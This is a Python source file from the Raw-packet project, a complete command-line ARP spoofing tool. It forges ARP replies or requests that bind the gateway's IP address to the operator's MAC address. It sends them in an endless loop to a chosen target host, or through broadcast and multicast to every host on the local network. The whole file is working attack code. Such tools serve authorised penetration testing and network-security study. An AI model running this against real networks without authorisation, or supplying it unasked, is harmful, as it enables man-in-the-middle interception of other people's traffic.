#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# region Description
"""
arp_spoof.py: ARP Spoofing (arp_spoof)
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import
from raw_packet.Utils.base import Base
from raw_packet.Utils.utils import Utils
from raw_packet.Utils.network import RawARP, RawSend
from argparse import ArgumentParser, RawDescriptionHelpFormatter
from time import sleep
from typing import Union, Dict
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2020, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Production'
__script_name__ = 'ARP Spoofing (arp_spoof)'
# endregion


# region class ArpSpoof
class ArpSpoof:

    # region Variables
    _base: Base = Base(admin_only=True, available_platforms=['Linux', 'Darwin', 'Windows'])
    _utils: Utils = Utils()
    _arp: RawARP = RawARP()
    
    _your: Dict[str, Union[None, str]] = {'network-interface': None, 'mac-address': None}
    _target: Dict[str, Union[None, str]] = {'ipv4-address': None, 'mac-address': None, 'vendor': None}
    # endregion

    # region Init
    def __init__(self, network_interface: str) -> None:
        """
        Init
        :param network_interface: Network interface name
        """
        self._your = self._base.get_interface_settings(interface_name=network_interface, 
                                                       required_parameters=['mac-address', 
                                                                            'ipv4-address',
                                                                            'first-ipv4-address',
                                                                            'last-ipv4-address'])
        self._raw_send: RawSend = RawSend(network_interface=network_interface)
    # endregion

    # region Start ARP Spoofing
    def start(self, 
              gateway_ipv4_address: Union[None, str] = None,
              target_ipv4_address: Union[None, str] = None,
              target_mac_address: Union[None, str] = None,
              ipv4_multicast: bool = False,
              ipv6_multicast: bool = False,
              broadcast: bool = False,
              requests: bool = False,
              quiet: bool = False) -> None:
        """
        Start ARP Spoofing
        :param gateway_ipv4_address: Gateway IPv4 address (example: '192.168.0.254')
        :param target_ipv4_address: Target IPv4 address (example: '192.168.0.1')
        :param target_mac_address: Target MAC address (example: '12:34:56:78:90:ab')
        :param ipv4_multicast: Send ARP replies/requests to IPv4 multicast MAC address
                               to spoof ARP table in all hosts in local network (default: False)
        :param ipv6_multicast: Send ARP replies/requests to IPv6 multicast MAC address
                               to spoof ARP table in all hosts in local network (default: False)
        :param broadcast: Send only ARP replies/requests to broadcast MAC address
                          to spoof ARP table in all hosts in local network (default: False)
        :param requests: Send only ARP requests to spoof ARP table in target host (default: False)
        :param quiet: Quit mode (default: False)
        :return: None
        """
        try:

            # region Set gateway IP address
            if gateway_ipv4_address is None:
                gateway_ipv4_address: str = self._your['ipv4-gateway']
                assert gateway_ipv4_address is not None, \
                    'Network interface: ' + self._base.error_text(self._your['network-interface']) + \
                    ' does not have IPv4 gateway! Please set IPv4 gateway address!'
            else:
                gateway_ipv4_address: str = \
                    self._utils.check_ipv4_address(network_interface=self._your['network-interface'],
                                                   ipv4_address=gateway_ipv4_address,
                                                   parameter_name='gateway IPv4 address',
                                                   is_local_ipv4_address=True)
            # endregion
    
            # region General output
            if not quiet:
                self._base.print_info('Network interface: ', self._your['network-interface'])
                self._base.print_info('Gateway IPv4 address: ', gateway_ipv4_address)
                self._base.print_info('Your IPv4 address: ', self._your['ipv4-address'])
                self._base.print_info('Your MAC address: ', self._your['mac-address'])
            # endregion
    
            # region ARP spoofing with IPv4/IPv6 Multicast/Broadcast ARP requests
            if ipv4_multicast or ipv6_multicast or broadcast:
                if ipv4_multicast:
                    ethernet_destination_mac_address: str = '01:00:5e:00:00:01'
                    if requests:
                        self._base.print_info('Send ARP requests to IPv4 multicast MAC address: ',
                                              ethernet_destination_mac_address)
                    else:
                        self._base.print_info('Send ARP replies to IPv4 multicast MAC address: ',
                                              ethernet_destination_mac_address)
                elif ipv6_multicast:
                    ethernet_destination_mac_address: str = '33:33:00:00:00:01'
                    if requests:
                        self._base.print_info('Send ARP requests to IPv6 multicast MAC address: ',
                                              ethernet_destination_mac_address)
                    else:
                        self._base.print_info('Send ARP replies to IPv6 multicast MAC address: ',
                                              ethernet_destination_mac_address)
                else:
                    ethernet_destination_mac_address: str = 'ff:ff:ff:ff:ff:ff'
                    if requests:
                        self._base.print_info('Send ARP requests to broadcast MAC address: ',
                                              ethernet_destination_mac_address)
                    else:
                        self._base.print_info('Send ARP replies to broadcast MAC address: ',
                                              ethernet_destination_mac_address)
    
                self._base.print_info('Spoof ARP table in all hosts: ', gateway_ipv4_address,
                                      ' -> ', self._your['mac-address'])
                self._base.print_info('ARP spoofing is running ...')

                if requests:
                    arp_packet: bytes = \
                        self._arp.make_request(ethernet_src_mac=self._your['mac-address'],
                                               ethernet_dst_mac=ethernet_destination_mac_address,
                                               sender_mac=self._your['mac-address'],
                                               sender_ip=gateway_ipv4_address,
                                               target_mac='00:00:00:00:00:00',
                                               target_ip=self._your['ipv4-address'])
                else:
                    arp_packet: bytes = \
                        self._arp.make_response(ethernet_src_mac=self._your['mac-address'],
                                                ethernet_dst_mac=ethernet_destination_mac_address,
                                                sender_mac=self._your['mac-address'],
                                                sender_ip=gateway_ipv4_address,
                                                target_mac='00:00:00:00:00:00',
                                                target_ip='0.0.0.0')
                while True:
                    self._raw_send.send_packet(packet=arp_packet)
                    sleep(1)
            # endregion
    
            # region Set target
            self._target = self._utils.set_ipv4_target(network_interface=self._your['network-interface'],
                                                       target_ipv4_address=target_ipv4_address,
                                                       target_mac_address=target_mac_address,
                                                       exclude_ipv4_addresses=[gateway_ipv4_address])
            if not quiet:
                self._base.print_success('Target IPv4 address: ', self._target['ipv4-address'])
                self._base.print_success('Target MAC address: ', self._target['mac-address'])
                if self._target['vendor'] is not None:
                    self._base.print_success('Target vendor: ', self._target['vendor'])
            # endregion
    
            # region Spoof ARP table
            self._base.print_info('Spoof ARP table: ', gateway_ipv4_address + ' -> ' + self._your['mac-address'])
    
            # region ARP spoofing with ARP requests
            if requests:
                self._base.print_info('Send ARP requests to: ',
                                      self._target['ipv4-address'] + ' (' +
                                      self._target['mac-address'] + ')')
                self._base.print_info('Start ARP spoofing ...')
                while True:
                    random_ip: str = self._base.get_random_ip_on_interface(self._your['network-interface'])
                    arp_request: bytes = \
                        self._arp.make_request(ethernet_src_mac=self._your['mac-address'],
                                               ethernet_dst_mac=self._target['mac-address'],
                                               sender_mac=self._your['mac-address'],
                                               sender_ip=gateway_ipv4_address,
                                               target_mac='00:00:00:00:00:00',
                                               target_ip=random_ip)
                    self._raw_send.send_packet(arp_request)
                    sleep(1)
            # endregion
    
            # region ARP spoofing with ARP responses
            else:
                self._base.print_info('Send ARP responses to: ',
                                      self._target['ipv4-address'] + ' (' +
                                      self._target['mac-address'] + ')')
                self._base.print_info('Start ARP spoofing ...')
                arp_response: bytes = \
                    self._arp.make_response(ethernet_src_mac=self._your['mac-address'],
                                            ethernet_dst_mac=self._target['mac-address'],
                                            sender_mac=self._your['mac-address'],
                                            sender_ip=gateway_ipv4_address,
                                            target_mac=self._target['mac-address'],
                                            target_ip=self._target['ipv4-address'])
                while True:
                    self._raw_send.send_packet(arp_response)
                    sleep(1)
            # endregion

            # endregion

        except KeyboardInterrupt:
            if not quiet:
                self._base.print_info('Exit')
            exit(0)

        except AssertionError as Error:
            if not quiet:
                self._base.print_error(Error.args[0])
            exit(1)
    # endregion

# endregion


# region Main function
def main() -> None:
    """
    Start ARP Spoofing (arp_spoof)
    :return: None
    """

    # region Init Raw-packet Base class
    base: Base = Base(admin_only=True, available_platforms=['Linux', 'Darwin', 'Windows'])
    # endregion

    # region Parse script arguments
    parser: ArgumentParser = ArgumentParser(description=base.get_banner(__script_name__),
                                            formatter_class=RawDescriptionHelpFormatter)
    parser.add_argument('-i', '--interface', help='Set interface name for send ARP packets', default=None)
    parser.add_argument('-t', '--target_ip', help='Set target IP address', default=None)
    parser.add_argument('-m', '--target_mac', help='Set target MAC address', default=None)
    parser.add_argument('-g', '--gateway_ip', help='Set gateway IP address', default=None)
    parser.add_argument('-r', '--requests', action='store_true', help='Send only ARP requests')
    parser.add_argument('--ipv4_multicast', action='store_true',
                        help='Send ARP replies/requests to IPv4 multicast MAC address')
    parser.add_argument('--ipv6_multicast', action='store_true',
                        help='Send ARP replies/requests to IPv6 multicast MAC address')
    parser.add_argument('--broadcast', action='store_true',
                        help='Send ARP replies/requests to broadcast MAC address')
    parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
    args = parser.parse_args()
    # endregion

    # region Print banner
    if not args.quiet:
        base.print_banner(__script_name__)
    # endregion

    # region Get current network interface
    current_network_interface: str = \
        base.network_interface_selection(interface_name=args.interface,
                                         message='Please select a network interface for ' +
                                                 __script_name__ + ' from table: ')
    # endregion
    
    # region Start Arp Spoof
    try:
        arp_spoof: ArpSpoof = ArpSpoof(network_interface=current_network_interface)
        arp_spoof.start(gateway_ipv4_address=args.gateway_ip,
                        target_ipv4_address=args.target_ip,
                        target_mac_address=args.target_mac,
                        ipv4_multicast=args.ipv4_multicast,
                        ipv6_multicast=args.ipv6_multicast,
                        broadcast=args.broadcast,
                        requests=args.requests,
                        quiet=args.quiet)

    except KeyboardInterrupt:
        if not args.quiet:
            base.print_info('Exit')
        exit(0)

    except AssertionError as Error:
        if not args.quiet:
            base.print_error(Error.args[0])
        exit(1)
    # endregion

# endregion


# region Call Main function
if __name__ == "__main__":
    main()
# endregion
